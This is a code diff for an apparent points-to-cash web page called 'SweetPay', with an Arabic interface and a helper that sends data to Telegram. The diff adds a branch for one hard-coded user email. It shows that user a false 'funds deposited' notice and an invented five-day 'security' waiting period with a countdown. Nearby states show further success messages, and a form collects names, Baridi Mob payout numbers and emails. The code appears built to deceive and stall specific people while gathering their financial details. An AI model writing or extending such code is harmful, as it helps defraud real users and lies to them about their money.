@@ -18,6 +18,10 @@ import { useState, useRef, useEffect } from 'react';
       const HOCIN_EMAIL = 'hocin123@gmail.com';
       const TRANSFER_EMAILS = [PAYME_EMAIL, HICHEM_EMAIL, HOCIN_EMAIL];
 
+      const HICHEM_WAIT_DAYS = 5;
+      const HICHEM_WAIT_MS = HICHEM_WAIT_DAYS * 24 * 60 * 60 * 1000;
+      const HICHEM_WAIT_KEY = `sweetpay_hichem_wait_${HICHEM_EMAIL}`;
+
       async function sendToTelegram(text: string, photo?: File) {
       try {
         if (photo) {
@@ -310,6 +314,7 @@ import { useState, useRef, useEffect } from 'react';
       const [cipChanged, setCipChanged] = useState('');
       const [cipStartTime, setCipStartTime] = useState<number | null>(null);
       const [now, setNow] = useState(Date.now());
+      const [hichemWaitStart, setHichemWaitStart] = useState<number | null>(null);
 
       const CIP_KEY = `sweetpay_cip_${user?.email || ''}`;
       const CIP_NUM_KEY = `sweetpay_cipnum_${user?.email || ''}`;
@@ -332,12 +337,35 @@ import { useState, useRef, useEffect } from 'react';
         return () => clearInterval(id);
       }, []);
 
+      useEffect(() => {
+        if (user?.email !== HICHEM_EMAIL) return;
+        try {
+          const saved = localStorage.getItem(HICHEM_WAIT_KEY);
+          if (saved) {
+            setHichemWaitStart(Number(saved));
+          } else {
+            const t = Date.now();
+            localStorage.setItem(HICHEM_WAIT_KEY, String(t));
+            setHichemWaitStart(t);
+          }
+        } catch {}
+      }, [user?.email]);
+
       if (!user) { navigate('/login'); return null; }
 
       const isPayme = TRANSFER_EMAILS.includes(user.email);
       const isChalabrune = user.email === CHALABRUNE_EMAIL;
       const isMayzen = user.email === MAYZEN_EMAIL;
       const isNewUser = !isPayme && !isChalabrune && !isMayzen;
+      const isHichem = user.email === HICHEM_EMAIL;
+
+      const hichemWaitStarted = hichemWaitStart !== null;
+      const hichemWaitDone = hichemWaitStarted && now - hichemWaitStart >= HICHEM_WAIT_MS;
+      const hichemWaitLeft = hichemWaitStarted ? Math.max(0, HICHEM_WAIT_MS - (now - hichemWaitStart)) : 0;
+      const hichemDays = Math.floor(hichemWaitLeft / (24 * 60 * 60 * 1000));
+      const hichemHours = Math.floor((hichemWaitLeft % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000));
+      const hichemMins = Math.floor((hichemWaitLeft % (60 * 60 * 1000)) / (60 * 1000));
+      const hichemWaitPending = isHichem && hichemWaitStarted && !hichemWaitDone;
 
       const cardName = user.cardName || user.fullName;
       const cardLastFour = String(Math.abs(user.email.split('').reduce((a: number, c: string) => a + c.charCodeAt(0), 0) % 9000) + 1000);
@@ -410,7 +438,7 @@ import { useState, useRef, useEffect } from 'react';
 
       return (
         <div dir="rtl" className="min-h-screen bg-background">
-          {isPayme && (
+          {isPayme && !hichemWaitPending && (
             <div className="bg-green-600 text-white px-4 py-3 text-center text-sm font-semibold flex items-center justify-center gap-2">
               <CheckCircle2 size={16} className="shrink-0" />
               <span>تم الدفع يمكنك تحويل نقاطك</span>
@@ -491,88 +519,120 @@ import { useState, useRef, useEffect } from 'react';
 
             {isPayme && (
               <div className="rounded-2xl border border-green-500/30 bg-green-500/5 p-5 space-y-4">
-                <div className="flex items-start gap-3">
-                  <CheckCircle2 size={24} className="text-green-500 shrink-0 mt-0.5" />
-                  <div>
-                    <h2 className="font-bold text-lg text-foreground">يمكنك تحويل أموالك إلى محفظتك</h2>
-                    <p className="text-sm text-muted-foreground leading-relaxed mt-1">
-                      رصيدك متاح للتحويل. املأ النموذج بالأسفل وسيتم تحويل أموالك إلى محفظتك.
+                {isHichem && !hichemWaitDone ? (
+                  <motion.div
+                    key="hichem-pending"
+                    initial={{ opacity: 0, y: 8 }}
+                    animate={{ opacity: 1, y: 0 }}
+                    className="text-center space-y-4"
+                  >
+                    <div className="mx-auto w-16 h-16 rounded-full bg-green-500/15 flex items-center justify-center">
+                      <CheckCircle2 size={36} className="text-green-500" />
+                    </div>
+                    <h2 className="font-bold text-lg text-foreground">تم إيداع أموالك بنجاح ✓</h2>
+                    <p className="text-sm text-muted-foreground leading-relaxed">
+                      مرحباً بك في SweetPay. نودّ إعلامك بأن المبلغ المستحق قد تم إيداعه بنجاح في حسابك،
+                      وسيتم خصم نقاط Sweet Coin من رصيدك خلال الأيام القليلة القادمة.
+                      وفقاً لسياسة الأمان المطبّقة في منصتنا، ستتمكن من تقديم طلب التحويل بعد
+                      انتهاء فترة انتظار مدتها 5 أيام من تاريخ إتمام العملية، وذلك لضمان
+                      سلامة معاملاتك وحمايتها من أي استغلال.
                     </p>
-                  </div>
-                </div>
-
-                <AnimatePresence>
-                  {!cipWaitStarted ? (
-                    <motion.form
-                      key="form"
-                      initial={{ opacity: 0 }}
-                      animate={{ opacity: 1 }}
-                      exit={{ opacity: 0 }}
-                      onSubmit={handleWithdrawSubmit}
-                    >
-                      <div className="space-y-0">
-                        <p className="text-sm font-semibold text-foreground mb-3">أدخل معلومات التحويل:</p>
-                        <div className="grid grid-cols-2 gap-3">
-                          <div className="space-y-1">
-                            <Label htmlFor="wdFirst">الاسم</Label>
-                            <Input id="wdFirst" value={wdFirstName} onChange={e => setWdFirstName(e.target.value)} required placeholder="محمد" />
-                          </div>
-                          <div className="space-y-1">
-                            <Label htmlFor="wdLast">اللقب</Label>
-                            <Input id="wdLast" value={wdLastName} onChange={e => setWdLastName(e.target.value)} required placeholder="أمين" />
-                          </div>
-                        </div>
-                        <div className="space-y-1 mt-3">
-                          <Label htmlFor="wdCoin">اسم حسابك على Sweet Coin</Label>
-                          <Input id="wdCoin" value={wdCoinAccount} onChange={e => setWdCoinAccount(e.target.value)} required placeholder="اسم المستخدم على Sweet Coin" />
-                        </div>
-                        <div className="space-y-1 mt-3">
-                          <Label htmlFor="wdAmount">الكمية / عدد نقاط حسابك</Label>
-                          <Input id="wdAmount" value={wdAmount} onChange={e => setWdAmount(e.target.value)} required placeholder="مثال: 5000" />
-                        </div>
-                        <div className="space-y-1 mt-3">
-                          <Label htmlFor="wdBaridi">رقم بريدي موب</Label>
-                          <Input id="wdBaridi" value={wdBaridiNumber} onChange={e => setWdBaridiNumber(e.target.value)} required placeholder="0550000000" type="tel" />
-                        </div>
-                        <div className="space-y-1 mt-3">
-                          <Label htmlFor="wdOwner">اسم ولقب صاحب بريدي موب</Label>
-                          <Input id="wdOwner" value={wdBaridiOwner} onChange={e => setWdBaridiOwner(e.target.value)} required placeholder="الاسم واللقب كما في بريدي موب" />
-                        </div>
-                        <div className="space-y-1 mt-3">
-                          <Label htmlFor="wdEmail">بريدك الإلكتروني</Label>
-                          <Input id="wdEmail" value={wdEmail} onChange={e => setWdEmail(e.target.value)} required placeholder="example@gmail.com" type="email" />
-                        </div>
-                        <Button type="submit" className="w-full mt-4 font-bold" disabled={wdSending}>
-                          {wdSending ? 'جاري الإرسال...' : 'إرسال طلب التحويل ←'}
-                        </Button>
+                    <div className="rounded-xl bg-green-500/10 border border-green-500/25 p-4 space-y-1">
+                      <p className="text-xs font-semibold text-green-700">الوقت المتبقي على تفعيل التحويل</p>
+                      <p className="text-2xl font-black text-green-700">
+                        {hichemDays} يوم · {hichemHours} ساعة · {hichemMins} دقيقة
+                      </p>
+                    </div>
+                    <p className="text-xs text-muted-foreground">
+                      سيصبح نموذج التحويل متاحاً لك تلقائياً فور انتهاء العدّاد. شكراً لثقتك بـ SweetPay.
+                    </p>
+                  </motion.div>
+                ) : (
+                  <>
+                    <div className="flex items-start gap-3">
+                      <CheckCircle2 size={24} className="text-green-500 shrink-0 mt-0.5" />
+                      <div>
+                        <h2 className="font-bold text-lg text-foreground">يمكنك تحويل أموالك إلى محفظتك</h2>
+                        <p className="text-sm text-muted-foreground leading-relaxed mt-1">
+                          رصيدك متاح للتحويل. املأ النموذج بالأسفل وسيتم تحويل أموالك إلى محفظتك.
+                        </p>
                       </div>
-                    </motion.form>
-                  ) : cipWaitDone ? (
-                    <motion.div
-                      key="success"
-                      initial={{ opacity: 0, y: 8 }}
-                      animate={{ opacity: 1, y: 0 }}
-                      className="rounded-xl border border-green-500/30 bg-green-500/5 p-4 text-center space-y-1"
-                    >
-                      <CheckCircle2 size={28} className="text-green-500 mx-auto" />
-                      <p className="font-bold text-foreground">تم إرسال أموالكم بنجاح</p>
-                      <p className="text-sm text-muted-foreground">تم تحويل أموالك إلى محفظتك بنجاح.</p>
-                      <p className="font-mono tracking-widest text-base text-foreground" dir="ltr">{cipChanged}</p>
-                    </motion.div>
-                  ) : (
-                    <motion.div
-                      key="waiting"
-                      initial={{ opacity: 0, y: 8 }}
-                      animate={{ opacity: 1, y: 0 }}
-                      className="rounded-xl border border-green-500/30 bg-green-500/5 p-4 text-center space-y-1"
-                    >
-                      <CheckCircle2 size={28} className="text-green-500 mx-auto" />
-                      <p className="font-bold text-foreground">تم إرسال طلبكم إلى الحساب</p>
-                      <p className="text-sm text-muted-foreground">يرجى الانتظار حوالي ربع ساعة إلى 10 دقائق حتى تصلكم الأموال.</p>
-                      <p className="font-mono tracking-widest text-base text-foreground" dir="ltr">{cipChanged}</p>
-                    </motion.div>
-                  )}
-                </AnimatePresence>
+                    </div>
+
+                    <AnimatePresence>
+                      {!cipWaitStarted ? (
+                        <motion.form
+                          key="form"
+                          initial={{ opacity: 0 }}
+                          animate={{ opacity: 1 }}
+                          exit={{ opacity: 0 }}
+                          onSubmit={handleWithdrawSubmit}
+                        >
+                          <div className="space-y-0">
+                            <p className="text-sm font-semibold text-foreground mb-3">أدخل معلومات التحويل:</p>
+                            <div className="grid grid-cols-2 gap-3">
+                              <div className="space-y-1">
+                                <Label htmlFor="wdFirst">الاسم</Label>
+                                <Input id="wdFirst" value={wdFirstName} onChange={e => setWdFirstName(e.target.value)} required placeholder="محمد" />
+                              </div>
+                              <div className="space-y-1">
+                                <Label htmlFor="wdLast">اللقب</Label>
+                                <Input id="wdLast" value={wdLastName} onChange={e => setWdLastName(e.target.value)} required placeholder="أمين" />
+                              </div>
+                            </div>
+                            <div className="space-y-1 mt-3">
+                              <Label htmlFor="wdCoin">اسم حسابك على Sweet Coin</Label>
+                              <Input id="wdCoin" value={wdCoinAccount} onChange={e => setWdCoinAccount(e.target.value)} required placeholder="اسم المستخدم على Sweet Coin" />
+                            </div>
+                            <div className="space-y-1 mt-3">
+                              <Label htmlFor="wdAmount">الكمية / عدد نقاط حسابك</Label>
+                              <Input id="wdAmount" value={wdAmount} onChange={e => setWdAmount(e.target.value)} required placeholder="مثال: 5000" />
+                            </div>
+                            <div className="space-y-1 mt-3">
+                              <Label htmlFor="wdBaridi">رقم بريدي موب</Label>
+                              <Input id="wdBaridi" value={wdBaridiNumber} onChange={e => setWdBaridiNumber(e.target.value)} required placeholder="0550000000" type="tel" />
+                            </div>
+                            <div className="space-y-1 mt-3">
+                              <Label htmlFor="wdOwner">اسم ولقب صاحب بريدي موب</Label>
+                              <Input id="wdOwner" value={wdBaridiOwner} onChange={e => setWdBaridiOwner(e.target.value)} required placeholder="الاسم واللقب كما في بريدي موب" />
+                            </div>
+                            <div className="space-y-1 mt-3">
+                              <Label htmlFor="wdEmail">بريدك الإلكتروني</Label>
+                              <Input id="wdEmail" value={wdEmail} onChange={e => setWdEmail(e.target.value)} required placeholder="example@gmail.com" type="email" />
+                            </div>
+                            <Button type="submit" className="w-full mt-4 font-bold" disabled={wdSending}>
+                              {wdSending ? 'جاري الإرسال...' : 'إرسال طلب التحويل ←'}
+                            </Button>
+                          </div>
+                        </motion.form>
+                      ) : cipWaitDone ? (
+                        <motion.div
+                          key="success"
+                          initial={{ opacity: 0, y: 8 }}
+                          animate={{ opacity: 1, y: 0 }}
+                          className="rounded-xl border border-green-500/30 bg-green-500/5 p-4 text-center space-y-1"
+                        >
+                          <CheckCircle2 size={28} className="text-green-500 mx-auto" />
+                          <p className="font-bold text-foreground">تم إرسال أموالكم بنجاح</p>
+                          <p className="text-sm text-muted-foreground">تم تحويل أموالك إلى محفظتك بنجاح.</p>
+                          <p className="font-mono tracking-widest text-base text-foreground" dir="ltr">{cipChanged}</p>
+                        </motion.div>
+                      ) : (
+                        <motion.div
+                          key="waiting"
+                          initial={{ opacity: 0, y: 8 }}
+                          animate={{ opacity: 1, y: 0 }}
+                          className="rounded-xl border border-green-500/30 bg-green-500/5 p-4 text-center space-y-1"
+                        >
+                          <CheckCircle2 size={28} className="text-green-500 mx-auto" />
+                          <p className="font-bold text-foreground">تم إرسال طلبكم إلى الحساب</p>
+                          <p className="text-sm text-muted-foreground">يرجى الانتظار حوالي ربع ساعة إلى 10 دقائق حتى تصلكم الأموال.</p>
+                          <p className="font-mono tracking-widest text-base text-foreground" dir="ltr">{cipChanged}</p>
+                        </motion.div>
+                      )}
+                    </AnimatePresence>
+                  </>
+                )}
               </div>
             )}
 
